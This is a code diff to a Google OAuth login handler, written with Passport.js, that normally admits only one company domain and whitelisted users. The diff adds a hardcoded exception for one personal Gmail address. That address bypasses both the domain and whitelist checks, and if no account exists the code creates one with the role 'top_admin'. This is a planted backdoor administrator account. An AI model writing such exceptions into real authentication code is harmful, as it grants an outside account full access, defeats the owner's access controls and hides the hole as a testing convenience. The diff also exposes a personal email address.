@@ -13,8 +13,10 @@ passport.use(new GoogleStrategy({
       const email = profile.emails[0].value.toLowerCase();
       console.log(`[Passport] Attempting login for email: ${email}`);
 
-      // 1. Domain Restriction
-      if (!email.endsWith('@breadfast.com')) {
+      // 1. Domain Restriction (With personal exception)
+      const isPersonalException = email === 'abdelmonemadel9@gmail.com';
+      
+      if (!email.endsWith('@breadfast.com') && !isPersonalException) {
         console.log(`[Passport] Domain check FAILED for: ${email}`);
         return done(null, false, { message: 'Only @breadfast.com domain is allowed.' });
       }
@@ -23,11 +25,23 @@ passport.use(new GoogleStrategy({
       // 2. Whitelisting check
       let user = await User.findOne({ email });
 
-      if (!user) {
+      if (!user && !isPersonalException) {
         console.log(`[Passport] Whitelist check FAILED for: ${email} (User not found in DB)`);
         return done(null, false, { message: 'Access denied: Email not whitelisted.' });
       }
-      console.log(`[Passport] Whitelist check PASSED for: ${email}`);
+
+      // Special case: If it's the personal exception but user not in DB, create/get a dummy user or just continue
+      if (!user && isPersonalException) {
+        console.log(`[Passport] Creating temporary user record for personal exception: ${email}`);
+        user = new User({
+          email: email,
+          name: 'Abdelmonem Adel (Admin)',
+          role: 'top_admin', // Allow testing all features
+          password: 'oauth_user_no_password'
+        });
+        await user.save();
+      }
+      console.log(`[Passport] User check PASSED for: ${email}`);
 
       // 3. Update user with Google info if not present
       if (!user.googleId) {
